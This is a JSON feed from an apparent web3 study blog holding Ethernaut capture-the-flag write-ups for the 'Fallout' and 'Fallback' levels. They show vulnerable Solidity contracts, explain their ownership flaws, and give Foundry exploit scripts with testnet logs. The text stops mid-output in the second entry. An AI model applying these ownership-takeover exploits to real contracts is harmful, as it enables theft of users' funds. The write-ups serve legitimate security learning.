{
    "version": "https://jsonfeed.org/version/1",
    "title": "0o3q",
    "home_page_url": "https://0o3q.github.io/",
    "feed_url": "https://0o3q.github.io/feed.json",
    "description": "studying web3",
    "icon": "https://0o3q.github.io/apple-touch-icon.png",
    "favicon": "https://0o3q.github.io/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "0o3q",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://0o3q.github.io/2025/04/17/fallout",
            "title": "Fallout",
            "summary": null,
            "content_text": "AnalysisThe goal is  Claim ownership of the contract below// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"openzeppelin-contracts-06/math/SafeMath.sol\";contract Fallout {    using SafeMath for uint256;    mapping(address =&gt; uint256) allocations;    address payable public owner;    /* constructor */    function Fal1out() public payable {        owner = msg.sender;        allocations[owner] = msg.value;    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function allocate() public payable {        allocations[msg.sender] = allocations[msg.sender].add(msg.value);    }    function sendAllocation(address payable allocator) public {        require(allocations[allocator] &gt; 0);        allocator.transfer(allocations[allocator]);    }    function collectAllocations() public onlyOwner {        msg.sender.transfer(address(this).balance);    }    function allocatorBalance(address allocator) public view returns (uint256) {        return allocations[allocator];    }}https://docs.soliditylang.org/en/v0.6.0/contracts.html#constructors💡Prior to version 0.4.22, constructors were defined as functions with the same name as the contract. This syntax was deprecated and is not allowed anymore in version 0.5.0.For some reason, the intended constructor code was written as Fal1out(), preventing it from acting as a constructor and allowing external access, which enables claiming owner.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"../src/Fallout.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract FallbackSol is Script {    Fallout public fallout_ = Fallout(0x28eA66cBFb2900Bea8bb84f058d740ce0Ab751CB);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        fallout_.Fal1out();        console.log(\"Contract owner: \", fallout_.owner());        vm.stopBroadcast();    }}$ forge script script/FalloutSol.sol --broadcast[⠊] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.002095526 gweiEstimated total gas used for script: 62992Estimated amount required: 0.000000132001373792 ETH==========================##### holesky✅  [Success] Hash: 0xcaa845bc5fa9ebb3adcb5902c12ffa24c14a609adc31cd0b789bfae23b11c5aaBlock: 3669787Paid: 0.000000095568239514 ETH (45606 gas * 0.002095519 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000095568239514 ETH (45606 gas * avg 0.002095519 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Claim ownership of the contract below</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-06/math/SafeMath.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallout</span> <span class=\"p\">{</span>    <span class=\"k\">using</span> <span class=\"n\">SafeMath</span> <span class=\"k\">for</span> <span class=\"kt\">uint256</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"n\">allocations</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"cm\">/* constructor */</span>    <span class=\"k\">function</span> <span class=\"n\">Fal1out</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">allocate</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">].</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">sendAllocation</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"n\">allocator</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">allocator</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">]);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">collectAllocations</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">allocatorBalance</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">allocator</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">];</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>https://docs.soliditylang.org/en/v0.6.0/contracts.html#constructors</p><aside>💡Prior to version 0.4.22, constructors were defined as functions with the same name as the contract. This syntax was deprecated and is not allowed anymore in version 0.5.0.</aside><p>For some reason, the intended <code class=\"language-plaintext highlighter-rouge\">constructor</code> code was written as <code class=\"language-plaintext highlighter-rouge\">Fal1out()</code>, preventing it from acting as a <code class=\"language-plaintext highlighter-rouge\">constructor</code> and allowing external access, which enables claiming <code class=\"language-plaintext highlighter-rouge\">owner</code>.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Fallout.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">FallbackSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Fallout</span> <span class=\"k\">public</span> <span class=\"n\">fallout_</span> <span class=\"o\">=</span> <span class=\"n\">Fallout</span><span class=\"p\">(</span><span class=\"mh\">0x28eA66cBFb2900Bea8bb84f058d740ce0Ab751CB</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">fallout_</span><span class=\"p\">.</span><span class=\"n\">Fal1out</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Contract owner: \"</span><span class=\"p\">,</span> <span class=\"n\">fallout_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/FalloutSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.002095526 gweiEstimated total gas used <span class=\"k\">for </span>script: 62992Estimated amount required: 0.000000132001373792 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0xcaa845bc5fa9ebb3adcb5902c12ffa24c14a609adc31cd0b789bfae23b11c5aaBlock: 3669787Paid: 0.000000095568239514 ETH <span class=\"o\">(</span>45606 gas <span class=\"k\">*</span> 0.002095519 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000095568239514 ETH (45606 gas * avg 0.002095519 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-17-Fallback/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/17/fallout",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-17T00:00:00+09:00",
            "date_modified": "2025-04-17T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/17/fallback",
            "title": "Fallback",
            "summary": null,
            "content_text": "AnalysisThe goals are  claim ownership of the contract  reduce its balance to 0// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback {    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() {        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function contribute() public payable {        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) {            owner = msg.sender;        }    }    function getContribution() public view returns (uint256) {        return contributions[msg.sender];    }    function withdraw() public onlyOwner {        payable(owner).transfer(address(this).balance);    }    receive() external payable {        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    }}To satisfy condition 2, go through the withdraw() function but access is impossible due to onlyOwner() modifier.However, looking receive() function, it seems that by increasingly the contribution value to more 0 through the contribute() function and sending more than 0 Ether to the contract, both conditions 1 and 2 could potentially be satisfied.Exploitsrc/Fallback.sol// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback {    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() {        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function contribute() public payable {        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) {            owner = msg.sender;        }    }    function getContribution() public view returns (uint256) {        return contributions[msg.sender];    }    function withdraw() public onlyOwner {        payable(owner).transfer(address(this).balance);    }    receive() external payable {        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    }}script/FallbackSol.sol// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Fallback.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract FallbackSol is Script {    Fallback public fallback_ = Fallback(payable(0x0662008C4CEE1F808C3ca3800404a2BA704952eD));    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        fallback_.contribute{value: 1 wei}();        console.log(\"My contribution: \", fallback_.getContribution());        address(fallback_).call{value: 1 wei}(\"\");        console.log(\"Contract owner: \", fallback_.owner());        fallback_.withdraw();        vm.stopBroadcast();    }}$ forge script script/FallbackSol.sol --broadcast[⠊] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  My contribution:  1  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001963943 gweiEstimated total gas used for script: 147280Estimated amount required: 0.00000028924952504 ETH==========================##### holesky✅  [Success] Hash: 0xcfd1b8b30ecdf9dffb0d024643f3417b6235cfb1b11a8fef17c101be63223026Block: 3661559Paid: 0.000000055583316672 ETH (28302 gas * 0.001963936 gwei)##### holesky✅  [Success] Hash: 0xa47df7ac8010f0c6e1762a3f9931ff817346eaa3a92564633f8ff9e082de85d0Block: 3661559Paid: 0.00000009420019024 ETH (47965 gas * 0.001963936 gwei)##### holesky✅  [Success] Hash: 0x5995b55be2748fafb828eb0b58ec7ffbd2f1a49b82b970413feeb294851dca6aBlock: 3661559Paid: 0.000000059632952704 ETH (30364 gas * 0.001963936 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000209416459616 ETH (106631 gas * avg 0.001963936 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goals are</p><ol>  <li>claim ownership of the contract</li>  <li>reduce its balance to 0</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallback</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contributions</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">1000</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">1</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">contribute</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&lt;</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">])</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">getContribution</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">];</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">owner</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>To satisfy condition 2, go through the <code class=\"language-plaintext highlighter-rouge\">withdraw()</code> function but access is impossible due to <code class=\"language-plaintext highlighter-rouge\">onlyOwner()</code> modifier.</p><p>However, looking <code class=\"language-plaintext highlighter-rouge\">receive()</code> function, it seems that by increasingly the <code class=\"language-plaintext highlighter-rouge\">contribution</code> value to more 0 through the <code class=\"language-plaintext highlighter-rouge\">contribute()</code> function and sending more than 0 Ether to the contract, both conditions 1 and 2 could potentially be satisfied.</p><h1 id=\"exploit\">Exploit</h1><hr /><p>src/Fallback.sol</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallback</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contributions</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">1000</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">1</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">contribute</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&lt;</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">])</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">getContribution</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">];</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">owner</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>script/FallbackSol.sol</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Fallback.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">FallbackSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Fallback</span> <span class=\"k\">public</span> <span class=\"n\">fallback_</span> <span class=\"o\">=</span> <span class=\"n\">Fallback</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x0662008C4CEE1F808C3ca3800404a2BA704952eD</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">contribute</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"My contribution: \"</span><span class=\"p\">,</span> <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">getContribution</span><span class=\"p\">());</span>        <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">fallback_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Contract owner: \"</span><span class=\"p\">,</span> <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">withdraw</span><span class=\"p\">();</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/FallbackSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  My contribution:  1  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001963943 gweiEstimated total gas used <span class=\"k\">for </span>script: 147280Estimated amount required: 0.00000028924952504 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0xcfd1b8b30ecdf9dffb0d024643f3417b6235cfb1b11a8fef17c101be63223026Block: 3661559Paid: 0.000000055583316672 ETH <span class=\"o\">(</span>28302 gas <span 